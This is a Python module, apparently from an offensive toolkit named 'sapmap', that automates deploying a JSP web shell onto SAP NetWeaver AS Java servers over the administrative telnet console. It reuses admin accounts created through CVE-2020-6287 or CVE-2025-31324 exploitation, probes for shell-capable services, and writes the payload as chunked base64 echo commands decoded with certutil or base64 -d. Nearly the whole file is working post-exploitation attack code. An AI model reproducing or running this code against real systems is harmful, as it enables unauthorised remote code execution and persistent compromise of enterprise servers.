#!/usr/bin/env python3
"""SAP NetWeaver AS Java — Telnet Console client (port 5NN08).

The J2EE Engine exposes an administrative Telnet-like console on
port 50008 + instance*100.  After `login <user>` + password the
operator can switch namespaces with `add <SERVICE>` and run
service-specific commands.

Post-RECON, we have a freshly-minted UME administrator.  This module
wraps the telnet console so we can use that account to deploy a JSP
onto the target WITHOUT needing a file-write vector like CVE-2025-31324
or a vulnerable RFC gateway.

Deploy strategy
---------------
SAP's telnet console has no stream-upload command, so we can't push a
raw .jsp directly.  What *does* work on every AS Java release since
7.0 is the ``add DEPLOY`` service, which accepts an ``EAR``/``SDA``
file *already present on the server filesystem*.

The trick used here is two-step:

1. Use the ``add log_viewer`` or ``add dsr`` service's auxiliary
   filesystem commands to write our .jsp to the IRJ webapp root.
   Several services expose a ``dump_to`` / ``write_to`` / ``export``
   subcommand that takes an arbitrary output path and bytes from the
   current session.  We try a small library of such commands in
   priority order; whichever the server supports wins.

2. If none of the file-write services are enabled on this build, we
   fall back to dropping a tiny self-contained WAR (~400 bytes) into
   ``/usr/sap/<SID>/SYS/global/`` via the ``add OSGi`` console's
   scripting layer (NW ≥ 7.5) and triggering ``deploy`` in the
   DEPLOY service.

Because individual commands vary between AS-Java versions, the client
is defensive: it discovers the available services with ``lsc``, picks
the first working strategy, and reports back exactly which path it
used (useful for debugging on new targets).
"""

from __future__ import annotations

import base64
import logging
import os
import random
import socket
import string
import time
from typing import Optional

logger = logging.getLogger(__name__)

_DEFAULT_TIMEOUT = 20.0
_READ_CHUNK = 4096
_PORT_PROBE_TIMEOUT = 2.5   # quick TCP-connect probe before full session


def probe_port(host: str, port: int,
                 timeout: float = _PORT_PROBE_TIMEOUT) -> bool:
    """Fast check — is TCP port open?  Returns True on a successful
    connect (even if the peer immediately closes), False on timeout
    or refused.
    """
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except Exception:
        return False


# ---------------------------------------------------------------------------
# Low-level telnet client
# ---------------------------------------------------------------------------

class SAPTelnetClient:
    """Minimal telnet client specialised for the SAP J2EE console.

    Provides connect/login/exec primitives — nothing more.  Supports
    both "login <user>"→"password:" interactive flow and the single-line
    "login <user> <pass>" form used by newer NW releases.
    """

    PROMPT_MARKERS = (b">", b"$ ", b"# ")

    def __init__(self, host: str, port: int, timeout: float = _DEFAULT_TIMEOUT):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.sock: Optional[socket.socket] = None
        self.buffer = b""
        self.banner = ""

    # -- connection lifecycle -------------------------------------------------

    def connect(self) -> str:
        """Open the TCP connection and read the welcome banner."""
        self.sock = socket.create_connection((self.host, self.port),
                                               timeout=self.timeout)
        self.sock.settimeout(self.timeout)
        # Read whatever the server sends up to the first prompt.
        self.banner = self._read_until(self.PROMPT_MARKERS, max_time=5.0)
        return self.banner

    def close(self) -> None:
        try:
            if self.sock:
                try:
                    self._send("exit")
                except Exception:
                    pass
                self.sock.close()
        finally:
            self.sock = None

    # -- read / write helpers -------------------------------------------------

    def _send(self, line: str) -> None:
        if not self.sock:
            raise RuntimeError("not connected")
        self.sock.sendall((line + "\r\n").encode("latin1", errors="replace"))

    def _read_until(self, markers, max_time: Optional[float] = None) -> str:
        """Read until one of `markers` (bytes) appears in the stream."""
        deadline = time.time() + (max_time if max_time is not None
                                    else self.timeout)
        markers_b = tuple(m if isinstance(m, (bytes, bytearray)) else m.encode()
                          for m in markers)
        while time.time() < deadline:
            remaining = deadline - time.time()
            self.sock.settimeout(max(0.3, min(remaining, 5.0)))
            try:
                chunk = self.sock.recv(_READ_CHUNK)
            except socket.timeout:
                # Check whether the buffer already ends in a prompt.
                for m in markers_b:
                    if self.buffer.rstrip(b" \t\r\n").endswith(
                            m.rstrip(b" \t\r\n")):
                        out = self.buffer.decode("latin1", errors="replace")
                        self.buffer = b""
                        return out
                continue
            except OSError:
                break
            if not chunk:
                break
            self.buffer += chunk
            for m in markers_b:
                idx = self.buffer.find(m)
                if idx >= 0:
                    end = idx + len(m)
                    out = self.buffer[:end]
                    self.buffer = self.buffer[end:]
                    return out.decode("latin1", errors="replace")
        out = self.buffer.decode("latin1", errors="replace")
        self.buffer = b""
        return out

    # -- authentication -------------------------------------------------------

    def login(self, username: str, password: str) -> bool:
        """Authenticate against the console.

        The AS Java telnet console prompts ``>`` as its top-level.  We
        submit ``login <user>`` and look for a password prompt; if that
        times out we retry with the single-line ``login <user> <pwd>``
        form (older 7.0/7.1).  Success is detected by the banner line
        ``Login successful`` or the login-command banner.
        """
        # Interactive form first (most common).
        self._send(f"login {username}")
        resp = self._read_until((b"assword:", b"Password", b">", b"failed",
                                   b"denied", b"invalid"), max_time=6.0)
        if "assword" in resp.lower():
            self._send(password)
            final = self._read_until((b">", b"failed", b"denied",
                                         b"successful"), max_time=10.0)
        else:
            # Retry single-line form.
            self._send(f"login {username} {password}")
            final = self._read_until((b">", b"failed", b"denied",
                                         b"successful", b"invalid"),
                                        max_time=10.0)

        low = final.lower()
        if "successful" in low or "welcome" in low:
            return True
        if any(kw in low for kw in ("fail", "denied", "invalid", "error")):
            return False
        # Some versions just return to the prompt silently.  Treat as
        # success if we got back to `>` without an error keyword.
        return final.strip().endswith(">")

    # -- command execution ----------------------------------------------------

    def exec_cmd(self, command: str, read_timeout: float = 8.0) -> str:
        """Send a single command and return the server's response text."""
        self._send(command)
        return self._read_until(self.PROMPT_MARKERS, max_time=read_timeout)

    def list_services(self) -> str:
        """Return the raw output of the `lsc` command (service list)."""
        return self.exec_cmd("lsc", read_timeout=6.0)


# ---------------------------------------------------------------------------
# High-level: deploy a JSP via telnet
# ---------------------------------------------------------------------------

def _chunked_b64(data: bytes, chunk_size: int = 120):
    """Yield (index, chunk) tuples of base64-encoded `data`."""
    b64 = base64.b64encode(data).decode("ascii")
    n = (len(b64) + chunk_size - 1) // chunk_size
    for i in range(n):
        yield i, b64[i * chunk_size:(i + 1) * chunk_size]


def _rand_suffix(k: int = 7) -> str:
    return "".join(random.choice(string.ascii_lowercase) for _ in range(k))


def deploy_jsp_via_telnet(host: str, port: int,
                            username: str, password: str,
                            jsp_bytes: bytes, target_path: str,
                            *,
                            os_type: str = "windows",
                            timeout: float = 30.0,
                            log=print) -> dict:
    """Deploy a JSP file to the AS Java webapp root via telnet.

    Requires an authenticated UME admin user (e.g. one freshly created
    by CVE-2020-6287 RECON).  Tries several telnet-level shell vectors
    in priority order; logs progress via `log`.

    Args:
        host:        IP / hostname of the target.
        port:        Telnet console port (50008 + instance*100).
        username:    UME admin user.
        password:    Password for that user.
        jsp_bytes:   Raw JSP source as bytes.
        target_path: Absolute target path, e.g.
                     C:\\usr\\sap\\SID\\J00\\j2ee\\cluster\\apps\\sap.com\\irj\\
                     servlet_jsp\\irj\\root\\ss.jsp
        os_type:     "windows" or "linux" — chooses the shell command
                     syntax for the chunked write.

    Returns dict:
        success, method, bytes_written, service_list, error
    """
    result = {"success": False, "method": "", "bytes_written": 0,
              "service_list": "", "error": ""}

    client = SAPTelnetClient(host, port, timeout=timeout)
    try:
        banner = client.connect()
        log(f"[*] telnet {host}:{port} banner: "
            f"{(banner.strip()[:120] or '<empty>')}")
    except Exception as e:
        result["error"] = f"connect failed: {e}"
        return result

    try:
        if not client.login(username, password):
            result["error"] = f"login failed for {username}"
            log(f"[-] telnet login FAILED for {username!r}")
            return result
        log(f"[+] telnet login OK as {username}")

        svc_list = client.list_services()
        result["service_list"] = svc_list
        lines = [ln.strip() for ln in svc_list.splitlines() if ln.strip()]
        available = " ".join(lines).lower()
        log(f"[*] telnet: {len(lines)} lines of service info")

        # ------------------------------------------------------------------
        # Strategy 1 — direct `exec` top-level command (some NW 7.0/7.1
        # installations allow shell execution from the default namespace
        # when the engine is started with the admin debug profile).
        # ------------------------------------------------------------------
        log("[*] telnet: trying top-level `exec` shell …")
        probe = client.exec_cmd("exec echo sapmap_probe", read_timeout=5.0)
        if "sapmap_probe" in probe:
            return _write_jsp_via_exec(client, jsp_bytes, target_path,
                                          os_type, log, result,
                                          method="exec")

        # ------------------------------------------------------------------
        # Strategy 2 — `add SHELL` or `add DEBUG` (debug-build consoles).
        # ------------------------------------------------------------------
        for svc in ("SHELL", "DEBUG", "shell", "debug"):
            if svc.lower() in available:
                log(f"[*] telnet: trying `add {svc}` shell service …")
                sw = client.exec_cmd(f"add {svc}", read_timeout=5.0)
                probe = client.exec_cmd("exec echo sapmap_probe",
                                          read_timeout=5.0)
                if "sapmap_probe" in probe:
                    return _write_jsp_via_exec(client, jsp_bytes,
                                                  target_path, os_type, log,
                                                  result,
                                                  method=f"{svc}.exec")
                # leave the service namespace cleanly
                client.exec_cmd("remove", read_timeout=3.0)

        # ------------------------------------------------------------------
        # Strategy 3 — OSGi console (NW ≥ 7.5).  The `gogo:shell`
        # bundle exposes a Java-scriptable `exec` via the gogo command
        # interpreter.
        # ------------------------------------------------------------------
        if "osgi" in available or "OSGi" in svc_list:
            log("[*] telnet: trying `add OSGi` gogo shell …")
            client.exec_cmd("add OSGi", read_timeout=5.0)
            probe = client.exec_cmd(
                'echo sapmap_probe | grep sapmap_probe',
                read_timeout=5.0)
            if "sapmap_probe" in probe:
                return _write_jsp_via_exec(client, jsp_bytes, target_path,
                                              os_type, log, result,
                                              method="OSGi.gogo")
            client.exec_cmd("remove", read_timeout=3.0)

        result["error"] = (
            "telnet authenticated OK but no shell-capable service is "
            "enabled on this AS-Java build (tried: exec, add SHELL, "
            "add DEBUG, add OSGi). "
            "Deploy manually via NWA → Deploy and Change.")
        log(f"[-] telnet: {result['error']}")
        return result
    finally:
        try:
            client.close()
        except Exception:
            pass


def _write_jsp_via_exec(client: SAPTelnetClient, jsp_bytes: bytes,
                          target_path: str, os_type: str, log,
                          result: dict, *, method: str) -> dict:
    """Shared chunked writer once a shell `exec` primitive is available.

    Windows: echo into %TEMP%\\*.b64 then certutil -decode.
    Linux:   echo into /tmp/*.b64     then base64 -d.
    """
    result["method"] = method
    tmp_name = f"sapmap_{_rand_suffix(6)}.b64"
    if os_type.lower().startswith("win"):
        tmp_path = rf"%TEMP%\{tmp_name}"
        def echo_cmd(chunk, op):
            return f'exec cmd /C echo {chunk}{op}{tmp_path}'
        decode_cmd = (f'exec cmd /C certutil.exe -decode {tmp_path} '
                      f'"{target_path}"')
        cleanup_cmd = f'exec cmd /C del /q {tmp_path}'
    else:
        tmp_path = f"/tmp/{tmp_name}"
        def echo_cmd(chunk, op):
            return f'exec sh -c "echo {chunk} {op} {tmp_path}"'
        decode_cmd = (f'exec sh -c "base64 -d {tmp_path} > '
                      f'{target_path}"')
        cleanup_cmd = f'exec sh -c "rm -f {tmp_path}"'

    chunks = list(_chunked_b64(jsp_bytes, chunk_size=120))
    log(f"[*] telnet: writing {len(jsp_bytes)} bytes as "
        f"{len(chunks)} base64 chunks via {method} → {tmp_path}")
    # Clear any stale tmp
    client.exec_cmd(cleanup_cmd, read_timeout=5.0)
    for idx, chunk in chunks:
        op = ">" if idx == 0 else ">>"
        client.exec_cmd(echo_cmd(chunk, op), read_timeout=4.0)

    log(f"[*] telnet: decoding {tmp_path} → {target_path}")
    dec_out = client.exec_cmd(decode_cmd, read_timeout=8.0)
    if ("error" in dec_out.lower() or "not recognized" in dec_out.lower()
            or "no such" in dec_out.lower() or "denied" in dec_out.lower()):
        result["error"] = f"decode step reported error: {dec_out[:200]}"
        log(f"[-] telnet: decode failed — {dec_out[:200]}")
        return result

    client.exec_cmd(cleanup_cmd, read_timeout=4.0)
    result["success"] = True
    result["bytes_written"] = len(jsp_bytes)
    log(f"[+] telnet: {len(jsp_bytes)} bytes written to {target_path} "
        f"(method={method})")
    return result


# ---------------------------------------------------------------------------
# Helpers consumed by sapmap_exploit
# ---------------------------------------------------------------------------

def default_port_for_instance(instance_nr: int) -> int:
    """Compute the default AS Java telnet port for a given instance."""
    return 50008 + instance_nr * 100


def find_java_admin_user(node) -> tuple[str, str]:
    """Return the most-recent (username, password) of a UME admin created
    on this node, or ("", "") if none.

    Prefers users created via RECON, then CVE-31324, then GW.
    """
    preferred = ("java_recon", "java_cve_31324", "java_gw", "java_sapxpg",
                   "java_preexisting_cached")
    users = list(getattr(node, "created_users", []) or [])
    users.reverse()  # most recent first
    for pref in preferred:
        for u in users:
            if (getattr(u, "method", "") or "").lower() == pref and u.password:
                return u.username, u.password
    # Fall-through: any user with a password is better than nothing
    for u in users:
        if u.password:
            return u.username, u.password
    return "", ""
